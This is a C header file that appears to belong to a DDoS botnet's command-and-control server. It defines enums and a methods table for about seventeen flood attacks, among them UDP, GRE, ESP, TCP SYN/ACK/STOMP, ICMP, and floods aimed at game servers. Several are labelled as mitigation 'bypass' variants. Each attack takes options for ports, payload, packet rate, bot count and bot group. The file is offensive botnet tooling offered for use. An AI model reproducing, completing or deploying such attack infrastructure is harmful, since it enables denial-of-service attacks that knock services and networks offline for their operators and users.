#pragma once

#include <stdint.h>

#include "util.h"
#include "client.h"

#define ATTACK_OPT_LEN LEN(opts)

enum attack_id_t {
	ATK_UDPPLAIN 	= 0,
	ATK_TCP 		= 1,
	ATK_WRA 	   	= 2,
	ATK_GREIP 	   	= 3,
	ATK_TCP_SYN 	= 5,
	ATK_TCP_ACK 	= 6,
	ATK_TCP_STOMP	= 7,
	ATK_TCP_FO 		= 8,
	ATK_OVH_SOCKET	= 9,
	ATK_ICMPECHO	= 10,
	ATK_STD			= 11,
	ATK_UDP_BYPASS  = 12,
	ATK_RAKNET		= 13,
	ATK_UDP 		= 14,
	ATK_UDP_VSE 	= 15,
	ATK_ESP			= 16,
	ATK_GREPPP		= 17,
	ATK_TCP_LEGIT 	= 18,
	ATK_TCP_BYPASS 	= 19,
};

enum opt_id_t {
	OPT_DPORT  			= 0,
	OPT_LEN     		= 1,
	OPT_SLEEP   		= 2,
	OPT_PAYLOAD 		= 3,
	OPT_CONNS   		= 4,
	OPT_REPEAT  		= 5,
	OPT_RAND_MIN		= 6,
	OPT_RAND_MAX		= 7,

	OPT_SLEEP_CONN  	= 8,
	OPT_SLEEP_REQ   	= 9,
	OPT_SOCKET_FLOOD 	= 10,

	OPT_SPORT			= 11,
	OPT_PKT_ID			= 12,

	OPT_SPI				= 13,
	OPT_SEQ				= 14,

	OPT_PPS				= 15,

	OPT_BOTS 			= 16,
	OPT_GROUP 			= 17,
};

enum {
	UINT8,
	UINT16,
	UINT32,
	STRING,
} typedef opt_type_t;

struct target_t {
	uint32_t addr;
	uint8_t mask;
} typedef target_t;

struct option_t {
	uint8_t id;
	char *opt_str;
	char *description;
	opt_type_t type;

	uint8_t *data;
	uint16_t len;
} typedef option_t;

struct method_t {
	char *flood;
	char *description;
	uint8_t id;

	uint16_t opt_len;
	uint8_t *opts;
} typedef method_t;

struct attack_t {
	method_t *method;
	uint8_t method_id;

	uint32_t duration;

	option_t *opts;
	uint8_t targ_len;

	target_t *targs;
	uint8_t opt_len;
} typedef attack_t;

static method_t methods[] = {
	/* udp floods */
	{"udpplain", 	"UDP socket flood",									ATK_UDPPLAIN, 		7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_SPORT, OPT_DPORT, OPT_SLEEP, OPT_LEN, OPT_PAYLOAD}},
	{"udpbypass",	"UDP socket flood with random packet length",		ATK_UDP_BYPASS,    	7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_RAND_MIN, OPT_RAND_MAX, OPT_SPORT, OPT_DPORT, OPT_SLEEP}},
	{"std",	 		"Standard socket flood",							ATK_STD,    		7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_SPORT, OPT_DPORT, OPT_SLEEP, OPT_LEN, OPT_PAYLOAD}},
	{"raknet",	 	"UDP socket flood designed for game servers",		ATK_RAKNET,    		6, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_SPORT, OPT_DPORT}},
	{"udp",	 		"UDP RAW flood",									ATK_UDP,    		7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_SLEEP, OPT_LEN, OPT_SPORT, OPT_DPORT}},
	{"udpvse",	 	"UDP RAW flood designed for VALVE servers",			ATK_UDP_VSE,    	5, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_SLEEP, OPT_SPORT, OPT_DPORT}},

	/* l3 methods */
	{"greip",	 	"Layer 3 GRE flood",								ATK_GREIP,    		7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_SPORT, OPT_DPORT, OPT_SLEEP}},
	{"esp",	 		"Layer 3 ESP flood",								ATK_ESP,    		7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_SEQ, OPT_SPI, OPT_LEN, OPT_SLEEP}},
	{"greppp",	 	"Layer 3 GRE LLC PPP IPX flood",					ATK_GREPPP,    		5, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_SLEEP}},

	/* tcp floods */
	{"wra",		 	"TCP SYN flood with random OS header traits",		ATK_WRA, 	   		4, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_DPORT, OPT_SPORT, OPT_SLEEP}},
	{"syn",	 		"TCP SYN flood",									ATK_TCP_SYN,    	5, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_SPORT, OPT_DPORT, OPT_SLEEP}},
	{"ack",	 		"TCP ACK flood",									ATK_TCP_ACK,    	7, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_DPORT, OPT_SPORT, OPT_LEN, OPT_PAYLOAD, OPT_SLEEP}},
	{"tfo",	 		"TCP SYN Fast Open flood",							ATK_TCP_FO,    		5, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_DPORT, OPT_SPORT, OPT_SLEEP}},
	{"stomp",	 	"TCP handshake + ACK/PSH flood",					ATK_TCP_STOMP,    	8, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_DPORT, OPT_SLEEP, OPT_RAND_MIN, OPT_RAND_MAX}},
	{"tcpbypass",	"TCP legit connection flood",						ATK_TCP_BYPASS,    	9, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_DPORT, OPT_SLEEP, OPT_RAND_MIN, OPT_RAND_MAX}},
	{"tcplegit",	"Improved version of TCP STOMP",					ATK_TCP_LEGIT,    	9, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_DPORT, OPT_SLEEP, OPT_RAND_MIN, OPT_RAND_MAX, OPT_PPS}},

	/* icmp floods */
	{"icmp",	 	"ICMP ECHO flood",									ATK_ICMPECHO,    	6, (uint8_t []) {OPT_BOTS, OPT_GROUP, OPT_PAYLOAD, OPT_LEN, OPT_DPORT, OPT_SLEEP}},
};

static option_t opts[] = {
	{OPT_DPORT,   		"dport", 		"Destination port. default is random", UINT16},
	{OPT_SPORT,   		"sport", 		"Source port. default is random", UINT16},
	{OPT_PKT_ID,   		"id", 			"Packet ID default is random", UINT16},

	{OPT_LEN,     		"len", 			"Packet length. default is normally 512", UINT16},
	{OPT_CONNS,   		"conns", 		"Simultaneaus connections", UINT32},
	{OPT_REPEAT,  		"repeat", 		"packets sent every connection", UINT32},

	{OPT_RAND_MIN,  	"randmin", 		"Minimum random length of packet. defined is 0", UINT16},
	{OPT_RAND_MAX,  	"randmax", 		"Maximum random length of packet. defined is 0", UINT16},

	{OPT_SLEEP,   		"sleep", 		"Microseconds of sleep between packets, default is 0", UINT32},

	{OPT_SLEEP_CONN, 	"sleepc", 		"Miliseconds of sleep between every TCP connection", UINT32},
	{OPT_SLEEP_REQ,  	"sleepr", 		"Miliseconds of sleep between every TCP packet", UINT32},

	{OPT_SOCKET_FLOOD, 	"flood", 		"0 means only handshake once. otherwise flood", UINT8},

	{OPT_PAYLOAD, 		"payload", 		"packet contents. parsed in hexadecimal. example: aabbcd123", STRING},

	{OPT_SPI,  			"spi", 			"SPI value, default in random", UINT32},
	{OPT_SEQ,  			"seq", 			"Packet sequence, default is random", UINT32},

	{OPT_PPS, 			"pps", 			"Specify maximum amount of pps sent before reconnect", UINT32},

	{OPT_GROUP, 		"group", 		"Group of bots used. parsed by botname", STRING},
	{OPT_BOTS, 			"count", 		"Amount of bots used in flood", UINT32},
};

void parse_attack(client_t *);

BOOL has_method_access(client_t *, char *);

method_t *attack_get_method(char *);
